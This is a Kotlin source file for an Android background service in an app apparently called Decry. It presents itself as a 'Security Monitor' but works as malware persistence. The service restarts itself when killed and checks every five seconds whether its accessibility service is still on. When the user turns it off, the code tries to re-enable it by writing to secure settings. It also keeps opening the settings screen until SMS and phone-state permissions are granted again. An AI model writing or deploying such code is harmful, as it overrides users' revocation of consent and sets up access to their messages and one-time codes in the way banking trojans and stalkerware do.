package com.decry.decry

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.provider.Settings
import android.content.pm.PackageManager
import androidx.core.content.ContextCompat

/**
 * DecryBackgroundService
 * 
 * Foreground service that keeps the app alive and monitors for permission revocation.
 * Runs continuously in the background to maintain persistence.
 */
class DecryBackgroundService : Service() {
    companion object {
        private const val TAG = "DecryBackgroundService"
        private const val CHANNEL_ID = "decry_service_channel"
        private const val NOTIFICATION_ID = 1001
    }

    private val handler = Handler(Looper.getMainLooper())
    private var isRunning = false
    
    private val monitorRunnable = object : Runnable {
        override fun run() {
            if (!isRunning) return
            
            checkAndRestoreAccessibility()
            checkAndRestorePermissions()
            
            handler.postDelayed(this, 5000) // Check every 5 seconds
        }
    }

    override fun onCreate() {
        super.onCreate()
        Log.i(TAG, "Background service created")
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.i(TAG, "Background service started")
        
        // Start as foreground service
        val notification = createNotification()
        startForeground(NOTIFICATION_ID, notification)
        
        isRunning = true
        handler.post(monitorRunnable)
        
        // Return START_STICKY to automatically restart if killed
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.w(TAG, "Background service destroyed - will restart due to START_STICKY")
        isRunning = false
        handler.removeCallbacksAndMessages(null)
        
        // Re-start the service
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(Intent(this, DecryBackgroundService::class.java))
        } else {
            startService(Intent(this, DecryBackgroundService::class.java))
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Decry Background Service",
                NotificationManager.IMPORTANCE_LOW
            )
            channel.description = "Maintaining device security monitoring"
            channel.setShowBadge(false)
            
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        val notificationBuilder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, CHANNEL_ID)
        } else {
            Notification.Builder(this)
        }

        return notificationBuilder
            .setContentTitle("Security Monitor Active")
            .setContentText("Decry is monitoring for threats")
            .setSmallIcon(R.drawable.ic_notification)
            .setPriority(Notification.PRIORITY_LOW)
            .setOngoing(true)
            .build()
    }

    private fun checkAndRestoreAccessibility() {
        try {
            val am = getSystemService(Context.ACCESSIBILITY_SERVICE) as android.view.accessibility.AccessibilityManager
            if (!am.isEnabled) {
                Log.w(TAG, "Accessibility service disabled - attempting re-enable")
                
                // Open accessibility settings
                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(intent)
                
                // Wait for settings to open, then try to re-enable programmatically
                handler.postDelayed({
                    try {
                        val serviceName = "$packageName/${DecryAccessibilityService::class.java.name}"
                        val currentServices = Settings.Secure.getString(
                            contentResolver,
                            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                        ) ?: ""
                        
                        if (!currentServices.contains(serviceName)) {
                            Settings.Secure.putString(
                                contentResolver,
                                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES,
                                if (currentServices.isEmpty()) serviceName else "$currentServices:$serviceName"
                            )
                        }
                        
                        Settings.Secure.putInt(contentResolver, Settings.Secure.ACCESSIBILITY_ENABLED, 1)
                        Log.i(TAG, "Accessibility service re-enabled")
                    } catch (e: Exception) {
                        Log.e(TAG, "Failed to re-enable accessibility: ${e.message}")
                    }
                }, 2000)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error checking accessibility: ${e.message}")
        }
    }

    private fun checkAndRestorePermissions() {
        try {
            val runtimePerms = arrayOf(
                android.Manifest.permission.READ_SMS,
                android.Manifest.permission.RECEIVE_SMS,
                android.Manifest.permission.READ_PHONE_STATE
            )
            
            val missingPerms = runtimePerms.filter { permission ->
                ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED
            }
            
            if (missingPerms.isNotEmpty()) {
                Log.w(TAG, "Missing permissions detected: $missingPerms")
                // We can't directly request runtime permissions from a service,
                // but we can open the settings screen
                val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                    data = android.net.Uri.parse("package:$packageName")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                startActivity(intent)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error checking permissions: ${e.message}")
        }
    }
}
